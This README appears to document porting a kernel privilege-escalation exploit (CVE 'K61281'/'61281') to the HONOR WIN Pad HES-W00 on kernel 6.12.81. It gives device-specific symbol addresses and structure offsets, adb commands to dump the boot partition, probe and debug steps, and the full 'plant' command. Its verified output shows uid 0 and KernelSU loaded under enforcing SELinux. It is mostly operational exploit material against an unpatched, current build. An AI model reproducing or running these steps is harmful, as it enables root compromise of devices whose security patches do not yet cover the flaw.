# HONOR WIN Pad (HES-W00 / HNHES-Q) 6.12.81 port

Support for the HONOR WIN Pad, an SM8850 (`canoe`) tablet on MagicOS 11 /
Android 17.

| Field | Value |
|---|---|
| Model | `HES-W00` (`HNHES-Q`) |
| Platform | Qualcomm `canoe` / SM8850 |
| Android | 17 (SDK 37), patch 2026-11-01 |
| Kernel | `6.12.81-android16-6-g52d15df5db87-abogki576042287-4k` |
| KMI | `android16-6.12` |
| SELinux | Enforcing (unrooted) |

## Status

Verified on the target on 2026-11-24:

```text
PROBE_TIMER made=128 recs=128 expected_low21=0xc3ac8
PROBE_SLIDE=0x2bd0000000 aligned=1
[calib] timers=512
PROBE_LINEAR_MAP=0xffffff7f80000000
PROBE_TASK=0xffffff8901411640 expected_low21=0x179134
PLANT_CRED_OK child=28933
LATE_LOAD_RC=0
```

```text
su -c id  -> uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
lsmod     -> kernelsu  221184  1
```

CVE logic is therefore not patched on this build.

## Constant provenance

HONOR builds its own Qualcomm vendor kernel; `g52d15df5db87` /
`abogki576042287` is a vendor-tree commit that does not exist in
`kernel/common` or as a GKI zip. The constants in `K61281_plant.c` therefore
come from **the target device's own boot Image**, recovered on 2026-11-24:

- `boot.img`: 100,663,296 B, SHA-256
  `565f1e43e9f817e3bb07a5c7629ba286c021d658ed8cdb2535ddc464c01c98b2`
- extracted `kernel`: 42,781,184 B, SHA-256
  `98c094cc62c3abc2bd8928c8b7865a10338d085523ebef4f39e88f76607d811e`
- banner: `Linux version 6.12.81-android16-6-g52d15df5db87-abogki576042287-4k`
- `kallsyms`: `n=133881`, `base=0xffffffc080000000`, `monotonic=OK`

```text
alloc_posix_timer = 0xffffffc0802c3aa0
  bl->kmem_cache_alloc_noprof @0xffffffc0802c3ac4
  site = 0xffffffc0802c3ac8  low21 = 0xc3ac8  (func+0x28)
copy_process = 0xffffffc080178fa4
  bl->kmem_cache_alloc_node_noprof @0xffffffc080179130
  site = 0xffffffc080179134  low21 = 0x179134  (func+0x18c)
BTF: k_itimer=0x100 it=0x78, cred=0xb8 uid=0x8,
     task_struct=0x1440 cred=0x900, tracepoint=0x50 funcs=0x48
static: selinux_state=0xffffffc08292ebc8, panic_on_warn=0xffffffc08267ade0,
        root_user=0xffffffc0826a2388, init_user_ns=0xffffffc0826a2110,
        init_ucounts=0xffffffc0826a3d20, init_groups=0xffffffc0826a3850
```

The earlier GKI r38 draft (`0xcadac`) is **not** valid on this vendor kernel:
it passed `auto_preflight()` but stopped with `[calib] timers=0`.

`alloc_posix_timer` retains the same two allocation call offsets (`+0x24` /
`+0x98`) as the vulnerable GKI 6.12.81 builds, and the BTF layout is
unchanged, so the CVE logic is present (confirmed by the successful plant).
The timer site is **not** inside `do_timer_create` like the 6.12.69 ports.

All addresses are link-time KASLR bases (`0xffffffc080000000` text,
`0xffffffc082...` data). The normal KASLR slide is discovered at runtime; the
constants do not encode a boot-time slide.

## Getting the boot image without a full ROM zip

The kernel lives in the `boot` partition. It is usually readable from an
unprivileged `adb shell` because shell is in the `disk` group; check first:

```powershell
adb shell id
adb shell ls -l /dev/block/by-name/ | Select-String 'boot'
```

If `id` lists `disk`, dump the active slot (A/B devices expose `boot` as a
symlink to `boot_a` or `boot_b`):

```powershell
adb shell "dd if=/dev/block/by-name/boot of=/sdcard/boot.img bs=1048576"
adb pull /sdcard/boot.img
```

`cat` works too when `dd` is unavailable:

```powershell
adb shell "cat /dev/block/by-name/boot > /sdcard/boot.img"
adb pull /sdcard/boot.img
```

Do **not** dump `init_boot` — the kernel is in `boot`; `init_boot` only holds
the generic ramdisk.

If shell is not in `disk` and `dd` says `Permission denied`, use the OTA
instead:

1. Trigger a full-package update in Settings / eRecovery on Wi-Fi.
2. While it downloads, capture the URL on the PC:
   `adb logcat -b all | Select-String -Pattern 'http|ota|hihonor'`
3. Download that zip, then extract the boot image from `payload.bin` with
   `payload-dumper-go -p boot payload.bin` (Android A/B OTA).
4. If local update from internal storage is supported, place the zip under
   `/sdcard/` and use the updater's "local package" entry.

Then unpack and recover:

```powershell
python ports/v2505a/tools/unpack_bootimg.py --boot_img boot.img --out boot_out
python ports/v2505a/recover.py boot_out/kernel
```

`recover.py` prints `alloc_posix_timer` call sites as well as
`copy_process`. Copy the `site(idx+1)` / `low21` values and the static data
addresses into `K61281_plant.c` and both `profiles.json` files.

`kallsyms names not located` is a parser failure, **not** a sign that the CVE
is patched. Check that the extracted kernel really is a bare ARM64 `Image`:

```powershell
python -c "print(open('boot_out/kernel','rb').read(4).hex())"
```

- `4d5a40fa` — bare ARM64 Image, correct
- `1f8b...` gzip, `28b52ffd` zstd, `02214c18` lz4, `fd377a585a00` xz —
  decompress first (`gunzip`, `zstd -d`, `lz4 -d`, `xz -d`)

The kallsyms layout also changes between builds. The parser handles the
trailing zero sentinel used by the 2026-10/11 builds; if it still fails, send
the kernel banner plus `recover.py` output so the layout can be added.

Whether the CVE is patched can only be judged after symbols decode, by
comparing `alloc_posix_timer` / `do_timer_create` against a known vulnerable
build. Allocation sites exist either way, so `[calib] timers=0` alone is a
site mismatch, not a patch indicator.

A debug build that prints every timer-sized allocation instead of filtering
by site is included as `ports/hes-w00/bin/libk61281dbg.so` (rebuild with
`$env:PLANT_CFLAGS = "-DPLANT_CALIB_DBG"`). Push it and run `probe`:

```powershell
adb push ports/hes-w00/bin/libk61281dbg.so /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/libk61281dbg.so"
adb shell "cd /data/local/tmp && ./libk61281dbg.so probe"
```

On a site mismatch it prints `[cdbg] pid=... site_low=... req=... alloc=...`
lines. The timer site is the `site_low` that repeats for the `alloc=0x100`
records. This identifies the site but still not the full link-time layout, so
use it as a cross-check for the boot-image result.


Because the vendor build can differ, run the read-only probe first:

```bash
adb shell "cd /data/local/tmp && ./libk61281.so probe"
```

`PROBE_KERNEL` / `PROBE_TRACE` / `PROBE_OK` from `auto_preflight()` only prove
that the release string matched and tracefs is readable. They do **not** test
the allocation site. The decisive line is `[calib] timers=N`: on a vendor
layout difference it is `timers=0` and the plant exits before any write.

The page chase is disabled for this kernel (`set_chase_pfn_filter()` is
rejected, so it would spend 12 s blind). A burst miss instead parks the
zombie and retries with a fresh plant, up to 5 attempts per stage
(`PLANT_RECLAIM_RETRY 1`). If a run ends in `FAIL_EXIT=... holder=...`,
reboot before the next run so no stale holder/zombie remains.

Expected:

```text
PROBE_TIMER made=... recs=... site=... expected_low21=0xc3ac8
PROBE_SLIDE=... aligned=1
PROBE_LINEAR_MAP=0xffffff8...
PROBE_TASK=0x... expected_low21=0x179134
PROBE_CRED=0x... req=0xb8 alloc=0xc0 uid_off=0x8
```

If `PROBE_TIMER made` is greater than 0 but `recs=0`, the vendor build moved
the allocation site. Pull the device's `boot` partition, recover the symbols
with `ports/v2505a/recover.py`, and replace `timer_site` / `timer_low21` /
`copy_low21` plus the data addresses in `K61281_plant.c` and both
`profiles.json` files. `recover.py` already scans `alloc_posix_timer`'s
callee and `copy_process+0x140`; on a vendor image use its printed
`bl->kmem_cache_alloc_noprof` line inside `alloc_posix_timer`.

Once `PROBE_TIMER` and `PROBE_TASK` match, run the plant:

```bash
adb shell "cd /data/local/tmp && \
  PYB110_MANAGER=kernelsu PYB110_KMI=android16-6.12 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KSUD=<manager-apk-dir>/lib/arm64/libksud.so \
  ./libk61281.so fake"
```

## Changes

1. `exploit/src/K61281_plant.c` — profile table and `profile_check`.
2. `exploit/rust-kplant/Cargo.toml` / `build.rs` / `exploit/build-all.sh` —
   `k61281` feature and runner build.
3. `exploit/rust-kplant/build.rs` — selects the NDK `windows-x86_64`
   prebuilt and the `.cmd` clang wrapper when building from Windows.
4. `JailbreakCore.kt` — release mapping, `libk61281.so`, universal-manager
   eligibility.
5. `MainActivity.kt` — `ExploitKind.CVE61281`, runner command, HONOR hides the
   ColorOS/vivo-only toggles.
6. `profiles.json` (repo root and app assets) — dynamic profile so beta
   profile sync can select the engine without an app update.

There is no `hooks_defend` gate on this kernel, so the ordinary KernelSU
late-load path and SUSFS (6.12 KO) are used.
